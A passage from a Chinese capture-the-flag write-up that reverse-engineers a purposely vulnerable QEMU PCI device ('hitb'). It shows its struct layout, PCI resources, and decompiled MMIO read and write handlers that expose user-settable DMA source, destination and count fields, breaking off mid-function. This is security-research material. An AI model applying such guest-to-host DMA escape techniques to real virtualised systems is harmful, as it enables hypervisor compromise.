</span></span><span class=line><span class=cl>00001BCE                 db ? ; undefined
</span></span><span class=line><span class=cl>00001BCF                 db ? ; undefined
</span></span><span class=line><span class=cl>00001BD0 HitbState       ends
</span></span><span class=line><span class=cl>00001BD0
</span></span><span class=line><span class=cl>00000000 ; ---------------------------------------------------------------------------
</span></span><span class=line><span class=cl>00000000
</span></span><span class=line><span class=cl>00000000 dma_state       struc ; (sizeof=0x20, align=0x8, copyof_1493)
</span></span><span class=line><span class=cl>00000000                                         ; XREF: HitbState/r
</span></span><span class=line><span class=cl>00000000 src             dq ?
</span></span><span class=line><span class=cl>00000008 dst             dq ?
</span></span><span class=line><span class=cl>00000010 cnt             dq ?
</span></span><span class=line><span class=cl>00000018 cmd             dq ?
</span></span><span class=line><span class=cl>00000020 dma_state       ends
</span></span></code></pre></td></tr></table></div></div><p>通过查看<code>hitb_class_init</code>函数找到vendor_id和device_id。在虚拟机里面查看具体信息。（这个busybox+kernel的虚拟机中的<code>lspci</code>指令比常规少一些选项，不像前一个题目STRNG中是一个完整的ubuntu发行版）</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ lspci --help
</span></span><span class=line><span class=cl>BusyBox v1.26.2 <span class=o>(</span>2017-05-26 14:27:34 CST<span class=o>)</span> multi-call binary.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Usage: lspci <span class=o>[</span>-mk<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>List all PCI devices
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	-m	Parsable output
</span></span><span class=line><span class=cl>	-k	Show driver
</span></span><span class=line><span class=cl>$ lspci
</span></span><span class=line><span class=cl>00:00.0 Class 0600: 8086:1237
</span></span><span class=line><span class=cl>00:01.3 Class 0680: 8086:7113
</span></span><span class=line><span class=cl>00:03.0 Class 0200: 8086:100e
</span></span><span class=line><span class=cl>00:01.1 Class 0101: 8086:7010
</span></span><span class=line><span class=cl>00:02.0 Class 0300: 1234:1111
</span></span><span class=line><span class=cl>00:01.0 Class 0601: 8086:7000
</span></span><span class=line><span class=cl>00:04.0 Class 00ff: 1234:2333
</span></span><span class=line><span class=cl>$ cat /sys/devices/pci0000<span class=se>\:</span>00/0000<span class=se>\:</span>00<span class=se>\:</span>04.0/resource
</span></span><span class=line><span class=cl>0x00000000fea00000 0x00000000feafffff 0x0000000000040200
</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
</span></span></code></pre></td></tr></table></div></div><p>在<code>pci_hitb_realize</code>函数中观察到使用<code>timer_init_tl</code>初始化了一个timer时钟，和通过<code>memory_region_init_io</code>初始化了MMIO。</p><p>MMIO的<code>hitb_mmio_read</code>函数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>uint64_t</span> <span class=kr>__fastcall</span> <span class=nf>hitb_mmio_read</span><span class=p>(</span><span class=n>HitbState</span> <span class=o>*</span><span class=n>opaque</span><span class=p>,</span> <span class=n>hwaddr</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint64_t</span> <span class=n>result</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>uint64_t</span> <span class=n>val</span><span class=p>;</span> <span class=c1>// [rsp+0h] [rbp-20h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>result</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>size</span> <span class=o>==</span> <span class=mi>4</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x80</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>src</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>&gt;</span> <span class=mh>0x80</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x8C</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>*</span><span class=p>(</span><span class=kt>dma_addr_t</span> <span class=o>*</span><span class=p>)((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>dst</span> <span class=o>+</span> <span class=mi>4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>&lt;=</span> <span class=mh>0x8C</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x84</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=k>return</span> <span class=o>*</span><span class=p>(</span><span class=kt>dma_addr_t</span> <span class=o>*</span><span class=p>)((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>src</span> <span class=o>+</span> <span class=mi>4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x88</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=k>return</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>dst</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=k>else</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x90</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=k>return</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cnt</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x98</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=k>return</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mi>8</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>qemu_mutex_lock</span><span class=p>(</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>thr_mutex</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>val</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>fact</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nf>qemu_mutex_unlock</span><span class=p>(</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>thr_mutex</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>val</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>&lt;=</span> <span class=mi>8</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=mh>0x10000EDLL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>addr</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mi>4</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=k>return</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>addr4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=k>else</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x20</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=k>return</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>status</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x24</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=k>return</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>irq_status</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><ol><li><code>addr == 0x80</code> &mdash;&mdash;> 读取dma.src</li><li><code>addr == 0x84</code> &mdash;&mdash;> 读取dma.src高地址处4字节</li><li><code>addr == 0x88</code> &mdash;&mdash;> 读取dma.dst</li><li><code>addr == 0x8c</code> &mdash;&mdash;> 读取dma.dst高地址处4字节</li><li><code>addr == 0x90</code> &mdash;&mdash;> 读取dma.cnt</li><li><code>addr == 0x98</code> &mdash;&mdash;> 读取dma.cmd</li></ol><p>MMIO的<code>hitb_mmio_write</code>函数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=kr>__fastcall</span> <span class=nf>hitb_mmio_write</span><span class=p>(</span><span class=n>HitbState</span> <span class=o>*</span><span class=n>opaque</span><span class=p>,</span> <span class=n>hwaddr</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>uint64_t</span> <span class=n>val</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint32_t</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// er13
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// edx
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>bool</span> <span class=n>v6</span><span class=p>;</span> <span class=c1>// zf
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int64_t</span> <span class=n>v7</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>  
</span></span><span class=line><span class=cl>  <span class=c1>// !((size - 4) &amp; 0xFFFFFFFB) 等价于测试size第4bit是否为1并且低3bit是否为0
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=n>addr</span> <span class=o>&gt;</span> <span class=mh>0x7F</span> <span class=o>||</span> <span class=n>size</span> <span class=o>==</span> <span class=mi>4</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=o>!</span><span class=p>((</span><span class=n>size</span> <span class=o>-</span> <span class=mi>4</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFB</span><span class=p>)</span> <span class=o>||</span> <span class=n>addr</span> <span class=o>&lt;=</span> <span class=mh>0x7F</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x80</span> <span class=p>)</span>  <span class=c1>// 设置dma.src
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>src</span> <span class=o>=</span> <span class=n>val</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>v4</span> <span class=o>=</span> <span class=n>val</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>&gt;</span> <span class=mh>0x80</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x8C</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>*</span><span class=p>(</span><span class=kt>dma_addr_t</span> <span class=o>*</span><span class=p>)((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>dst</span> <span class=o>+</span> <span class=mi>4</span><span class=p>)</span> <span class=o>=</span> <span class=n>val</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>&gt;</span> <span class=mh>0x8C</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x90</span> <span class=p>)</span>  <span class=c1>// 设置dma.cnt
</span></span></span><span class=line><span class=cl><span class=c1></span>          <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>              <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cnt</span> <span class=o>=</span> <span class=n>val</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span>
</span></span><span class=line><span class=cl>          <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x98</span> <span class=o>&amp;&amp;</span> <span class=n>val</span> <span class=o>&amp;</span> <span class=mi>1</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=p>)</span>  <span class=c1>// 设置dma.cmd
</span></span></span><span class=line><span class=cl><span class=c1></span>          <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>=</span> <span class=n>val</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>v7</span> <span class=o>=</span> <span class=nf>qemu_clock_get_ns</span><span class=p>(</span><span class=n>QEMU_CLOCK_VIRTUAL_0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nf>timer_mod</span><span class=p>(</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma_timer</span><span class=p>,</span> <span class=n>v7</span> <span class=o>/</span> <span class=mi>1000000</span> <span class=o>+</span> <span class=mi>100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x84</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>*</span><span class=p>(</span><span class=kt>dma_addr_t</span> <span class=o>*</span><span class=p>)((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>src</span> <span class=o>+</span> <span class=mi>4</span><span class=p>)</span> <span class=o>=</span> <span class=n>val</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x88</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=p>)</span>  <span class=c1>// 设置dma.dst
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>dst</span> <span class=o>=</span> <span class=n>val</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mi>32</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>val</span> <span class=o>&amp;</span> <span class=mh>0x80</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=nf>_InterlockedOr</span><span class=p>((</span><span class=k>volatile</span> <span class=kt>signed</span> <span class=kr>__int32</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>status</span><span class=p>,</span> <span class=mh>0x80u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span>
</span></span><span class=line><span class=cl>          <span class=nf>_InterlockedAnd</span><span class=p>((</span><span class=k>volatile</span> <span class=kt>signed</span> <span class=kr>__int32</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>status</span><span class=p>,</span> <span class=mh>0xFFFFFF7F</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>&gt;</span> <span class=mh>0x20</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mi>96</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=n>v6</span> <span class=o>=</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>val</span> <span class=o>|</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>irq_status</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>irq_status</span> <span class=o>|=</span> <span class=n>val</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>v6</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nf>hitb_raise_irq</span><span class=p>(</span><span class=n>opaque</span><span class=p>,</span> <span class=mh>0x60u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mi>100</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=n>v5</span> <span class=o>=</span> <span class=o>~</span><span class=p>(</span><span class=n>_DWORD</span><span class=p>)</span><span class=n>val</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=n>v6</span> <span class=o>=</span> <span class=p>(</span><span class=n>v5</span> <span class=o>&amp;</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>irq_status</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>irq_status</span> <span class=o>&amp;=</span> <span class=n>v5</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=k>if</span> <span class=p>(</span> <span class=n>v6</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nf>msi_enabled</span><span class=p>(</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>pdev</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nf>pci_set_irq</span><span class=p>(</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>pdev</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mi>4</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span>
